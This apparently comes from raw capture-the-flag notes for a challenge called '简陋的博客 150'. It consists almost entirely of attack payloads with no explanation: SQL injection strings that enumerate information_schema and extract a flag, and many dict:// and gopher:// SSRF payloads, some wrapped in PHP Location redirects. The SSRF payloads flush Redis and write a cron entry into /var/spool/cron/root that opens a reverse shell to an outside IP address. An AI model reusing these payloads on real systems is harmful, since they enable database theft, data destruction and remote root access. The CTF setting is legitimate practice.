
简陋的博客 150

a=article` where 1=-1 union all select 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables%23
flag_is_here

a=article` where 1=-1 union all select 1,table_name,column_name FROM information_schema.columns limit 1 offset 318%23
flag_is_here:flag

a=article` where 1=-1 union all select 1,2,flag FROM flag_is_here%23
SYC{O0o._O0o._O0o._O0o._O0o.}


dict://127.0.0.1:6379/_*1
$8
flushall
*3
$3
set
$1
1
$64

%0a%0a*/1 * * * * bash -i >& /dev/tcp/115.159.196.171/2333 0>&1%0a%0a%0a%0a%0a


*4
$6
config
$3
set
$3
dir
$16
/var/spool/cron/
*4
$6
config
$3
set
$10
dbfilename
$4
root
*1
$4
save
quit


dict://172.18.0.2:6379/_*1
$8
flushall
*3
$3
set
$1
1
$64

%0a%0a*/1 * * * * bash -i >& /dev/tcp/115.159.196.171/2333 0>&1%0a%0a%0a%0a%0a


*4
$6
config
$3
set
$3
dir
$16
/var/spool/cron/
*4
$6
config
$3
set
$10
dbfilename
$4
root
*1
$4
save
quit


dict://127.0.0.1:2333/test%0d%0a*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>%26%20/dev/tcp/115.159.196.171/2334%200>%261%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a

dict://127.0.0.1:2333/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/115.159.196.171/2333%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

dict://127.0.0.1:2333/_*1%0D%0A$8%0D%0Aflushall%0D%0A*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0A1%0D%0A$64%0D%0A%0D%0A%0a%0a*/1 * * * * bash -i >& /dev/tcp/115.159.196.171/2333 0>&1%0a%0a%0a%0a%0a%0D%0A%0D%0A%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$16%0D%0A/var/spool/cron/%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$4%0D%0Aroot%0D%0A*1%0D%0A$4%0D%0Asave%0D%0Aquit%0D%0A

gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 
0>&1%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0ad
ir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$
10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aq
uit%0d%0a

dict://127.0.0.1:6379/set:0:%22%5Cx0a%5Cx0a*/1%5Cx20*%5Cx20*%5Cx20*%5Cx20*%5Cx20/bin/bash%5Cx20-i%5Cx20%3E%5Cx26%5Cx20/dev/tcp//%5Cx200%3E%5Cx261%5Cx0a%5Cx0a%5Cx0a%22

header('Location: dict://172.18.0.2:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2462%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/115.159.196.171/2333%200%3E%261%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A');

header('Location: dict://172.18.0.2:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/115.159.196.171/2333%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a');

header('Location: http://115.159.196.171/phpwaf.php?test');

172.18.0.2
